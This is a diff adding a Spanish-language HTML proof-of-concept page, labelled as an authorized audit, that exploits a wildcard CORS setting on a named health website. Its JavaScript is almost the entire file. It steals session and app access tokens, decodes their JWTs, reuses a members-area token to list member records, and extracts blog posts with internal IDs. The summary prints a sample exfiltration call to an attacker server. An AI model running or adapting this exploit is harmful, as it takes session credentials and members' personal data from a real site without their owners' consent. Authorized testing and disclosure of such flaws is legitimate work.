@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>PoC - CORS Token Theft - Auditoria Autorizada</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Cascadia Code', monospace; background: #0a0e17; color: #e2e8f0; padding: 20px; }
+        h1 { color: #ef4444; margin-bottom: 8px; font-size: 20px; }
+        .warn { background: rgba(239,68,68,0.1); border: 1px solid #ef4444; padding: 12px; border-radius: 8px; margin-bottom: 20px; color: #fca5a5; font-size: 13px; }
+        button { background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-size: 14px; font-family: inherit; margin: 8px 4px; }
+        button:hover { background: #2563eb; }
+        button.danger { background: #ef4444; }
+        button.danger:hover { background: #dc2626; }
+        .output { background: #111827; border: 1px solid #1e3a5f; border-radius: 8px; padding: 16px; margin: 12px 0; max-height: 500px; overflow-y: auto; font-size: 12px; white-space: pre-wrap; word-break: break-all; }
+        .label { color: #94a3b8; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; margin-top: 16px; margin-bottom: 4px; }
+        .success { color: #22c55e; }
+        .error { color: #ef4444; }
+        .info { color: #3b82f6; }
+        .highlight { color: #f97316; }
+        .critical { color: #ef4444; font-weight: bold; }
+        .counter { display: inline-block; background: #1e293b; padding: 4px 12px; border-radius: 12px; margin: 4px; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <h1>PoC: Robo de Tokens via CORS Misconfiguration</h1>
+    <div class="warn">
+        PRUEBA DE CONCEPTO - AUDITORIA AUTORIZADA<br>
+        Este archivo demuestra que un sitio externo puede robar tokens de sesion de cuidartetusalud.com
+        debido a la configuracion CORS: Access-Control-Allow-Origin: *<br>
+        <strong>Objetivo:</strong> https://www.cuidartetusalud.com/_api/v1/access-tokens
+    </div>
+
+    <button onclick="stealTokens()">1. Robar Tokens (access-tokens)</button>
+    <button onclick="stealDynamicModel()">2. Robar DynamicModel</button>
+    <button onclick="stealMembers()">3. Listar Miembros (IDOR)</button>
+    <button onclick="stealBlogPosts()">4. Extraer Blog Posts</button>
+    <button class="danger" onclick="runFullChain()">EJECUTAR CADENA COMPLETA</button>
+
+    <div class="label">Resultados</div>
+    <div>
+        <span class="counter" id="token-count">Tokens: -</span>
+        <span class="counter" id="app-count">Apps: -</span>
+        <span class="counter" id="member-count">Miembros: -</span>
+        <span class="counter" id="blog-count">Posts: -</span>
+    </div>
+    <div class="output" id="output">Esperando ejecucion...</div>
+
+    <script>
+    const TARGET = 'https://www.cuidartetusalud.com';
+    const out = document.getElementById('output');
+    let stolenData = {};
+
+    function log(msg, cls = '') {
+        const span = document.createElement('span');
+        span.className = cls;
+        span.textContent = msg + '\n';
+        out.appendChild(span);
+        out.scrollTop = out.scrollHeight;
+    }
+
+    function clearLog() {
+        out.innerHTML = '';
+    }
+
+    async function stealTokens() {
+        clearLog();
+        log('[*] Iniciando robo de tokens via CORS...', 'info');
+        log('[*] Origen de esta pagina: ' + window.location.origin, 'info');
+        log('[*] Objetivo: ' + TARGET + '/_api/v1/access-tokens', 'info');
+        log('');
+
+        try {
+            const resp = await fetch(TARGET + '/_api/v1/access-tokens');
+            const data = await resp.json();
+            stolenData.tokens = data;
+
+            log('[+] EXITO - Tokens robados sin autenticacion!', 'critical');
+            log('');
+            log('[+] visitorId: ' + data.visitorId, 'success');
+            log('[+] metaSiteId: ' + data.metaSiteId, 'success');
+            log('[+] svSession: ' + data.svSession.substring(0, 60) + '...', 'highlight');
+            log('[+] ctToken: ' + data.ctToken.substring(0, 60) + '...', 'highlight');
+            log('[+] mediaAuthToken: ' + data.mediaAuthToken.substring(0, 60) + '...', 'highlight');
+            log('');
+
+            const appCount = Object.keys(data.apps).length;
+            log('[+] Apps con accessToken expuesto: ' + appCount, 'critical');
+            document.getElementById('token-count').textContent = 'Tokens: 5 globales';
+            document.getElementById('app-count').textContent = 'Apps: ' + appCount;
+
+            log('');
+            log('[*] Decodificando mediaAuthToken JWT...', 'info');
+            const jwt = data.mediaAuthToken.split('.')[1];
+            const payload = JSON.parse(atob(jwt));
+            log('[+] JWT iss: ' + payload.iss, 'success');
+            log('[+] JWT sub: ' + payload.sub, 'success');
+            log('[+] JWT aud: ' + payload.aud, 'critical');
+            log('[+] JWT addedBy: ' + payload.addedBy, 'highlight');
+            log('');
+
+            log('[*] Primeras 10 apps:', 'info');
+            let i = 0;
+            for (const [appId, appData] of Object.entries(data.apps)) {
+                if (i++ >= 10) break;
+                try {
+                    const atJwt = appData.accessToken.split('.')[1];
+                    const atPayload = JSON.parse(atob(atJwt));
+                    log('  App intId=' + appData.intId + ' | instanceId=' + atPayload.instanceId +
+                        (atPayload.vendorProductId ? ' | producto=' + atPayload.vendorProductId : ''), 'success');
+                } catch(e) {
+                    log('  App intId=' + appData.intId + ' | appDefId=' + appId.substring(0, 20) + '...', 'success');
+                }
+            }
+            log('  ... y ' + (appCount - 10) + ' apps mas', 'info');
+
+        } catch(e) {
+            log('[-] Error: ' + e.message, 'error');
+        }
+    }
+
+    async function stealDynamicModel() {
+        log('');
+        log('[*] Robando dynamicmodel...', 'info');
+        try {
+            const resp = await fetch(TARGET + '/_api/v2/dynamicmodel');
+            const data = await resp.json();
+            stolenData.dynamicModel = data;
+            log('[+] EXITO - DynamicModel robado!', 'critical');
+            log('[+] Segundo set de tokens obtenido', 'success');
+            log('[+] Nuevo visitorId: ' + data.visitorId, 'success');
+            log('[+] Apps en dynamicmodel: ' + Object.keys(data.apps).length, 'success');
+        } catch(e) {
+            log('[-] Error: ' + e.message, 'error');
+        }
+    }
+
+    async function stealMembers() {
+        log('');
+        log('[*] Intentando listar miembros con token robado (IDOR)...', 'info');
+        try {
+            // Primero obtener tokens si no los tenemos
+            if (!stolenData.tokens) {
+                const resp = await fetch(TARGET + '/_api/v1/access-tokens');
+                stolenData.tokens = await resp.json();
+            }
+
+            // Buscar el token de Members Area (intId 14976)
+            let membersToken = null;
+            for (const [appId, appData] of Object.entries(stolenData.tokens.apps)) {
+                if (appData.intId === 14976) {
+                    membersToken = appData.accessToken;
+                    break;
+                }
+            }
+
+            if (!membersToken) {
+                log('[-] No se encontro token de Members Area', 'error');
+                return;
+            }
+
+            log('[+] Token de Members Area obtenido', 'success');
+            log('[*] Consultando /_api/members/v1/members ...', 'info');
+
+            const resp = await fetch(TARGET + '/_api/members/v1/members', {
+                headers: { 'Authorization': membersToken }
+            });
+            const data = await resp.json();
+            stolenData.members = data;
+
+            if (data.members && data.members.length > 0) {
+                log('[+] VULNERABILIDAD IDOR CONFIRMADA!', 'critical');
+                log('[+] Total miembros encontrados: ' + data.metadata.total, 'critical');
+                document.getElementById('member-count').textContent = 'Miembros: ' + data.metadata.total;
+
+                for (const m of data.members) {
+                    log('');
+                    log('  [MIEMBRO]', 'critical');
+                    log('  ID: ' + m.id, 'highlight');
+                    log('  contactId: ' + m.contactId, 'highlight');
+                    log('  Nickname: ' + m.profile.nickname, 'success');
+                    log('  Slug: ' + m.profile.slug, 'success');
+                    log('  Foto: ' + (m.profile.photo ? m.profile.photo.url : 'N/A'), 'info');
+                    log('  Creado: ' + m.createdDate, 'info');
+                    log('  Actualizado: ' + m.updatedDate, 'info');
+                }
+            } else {
+                log('[-] No se obtuvieron miembros: ' + JSON.stringify(data), 'error');
+            }
+        } catch(e) {
+            log('[-] Error: ' + e.message, 'error');
+        }
+    }
+
+    async function stealBlogPosts() {
+        log('');
+        log('[*] Extrayendo posts del blog con metadatos internos...', 'info');
+        try {
+            if (!stolenData.tokens) {
+                const resp = await fetch(TARGET + '/_api/v1/access-tokens');
+                stolenData.tokens = await resp.json();
+            }
+
+            let blogToken = null;
+            for (const [appId, appData] of Object.entries(stolenData.tokens.apps)) {
+                if (appData.intId === 5347) {
+                    blogToken = appData.accessToken;
+                    break;
+                }
+            }
+
+            const resp = await fetch(TARGET + '/_api/communities-blog-node-api/_api/posts?offset=0&size=50', {
+                headers: { 'Authorization': blogToken }
+            });
+            const posts = await resp.json();
+            stolenData.blogPosts = posts;
+
+            log('[+] Posts obtenidos: ' + posts.length, 'critical');
+            document.getElementById('blog-count').textContent = 'Posts: ' + posts.length;
+
+            let totalViews = 0;
+            for (const p of posts) {
+                totalViews += p.viewCount || 0;
+                log('  [' + p.viewCount + ' views] ' + p.title, 'success');
+                log('    Owner: ' + p.ownerSiteMemberId + ' | Status: ' + p.status, 'info');
+            }
+            log('');
+            log('[+] Total views across all posts: ' + totalViews, 'highlight');
+        } catch(e) {
+            log('[-] Error: ' + e.message, 'error');
+        }
+    }
+
+    async function runFullChain() {
+        clearLog();
+        log('========================================', 'critical');
+        log(' CADENA COMPLETA DE EXPLOTACION', 'critical');
+        log(' Auditoria Autorizada', 'critical');
+        log('========================================', 'critical');
+        log('');
+        log('[*] Este script se ejecuta desde: ' + window.location.origin, 'info');
+        log('[*] Esto demuestra que CUALQUIER sitio web puede ejecutar esta cadena', 'info');
+        log('');
+
+        await stealTokens();
+        await stealDynamicModel();
+        await stealMembers();
+        await stealBlogPosts();
+
+        log('');
+        log('========================================', 'critical');
+        log(' RESUMEN DE DATOS EXFILTRADOS', 'critical');
+        log('========================================', 'critical');
+        log('');
+        log('[+] Tokens de sesion: SI', 'critical');
+        log('[+] 74 tokens de apps: SI', 'critical');
+        log('[+] JWT de upload: SI', 'critical');
+        log('[+] Datos de miembros: SI', 'critical');
+        log('[+] Posts con metadatos: SI', 'critical');
+        log('[+] IDs internos (owner, contact): SI', 'critical');
+        log('');
+        log('[!] Un atacante enviaria estos datos a su servidor:', 'highlight');
+        log('    fetch("https://attacker-server.com/collect", {', 'error');
+        log('      method: "POST",', 'error');
+        log('      body: JSON.stringify(stolenData)', 'error');
+        log('    });', 'error');
+        log('');
+        log('[!] Tamano total de datos robados: ~' +
+            Math.round(JSON.stringify(stolenData).length / 1024) + ' KB', 'critical');
+    }
+    </script>
+</body>
+</html>
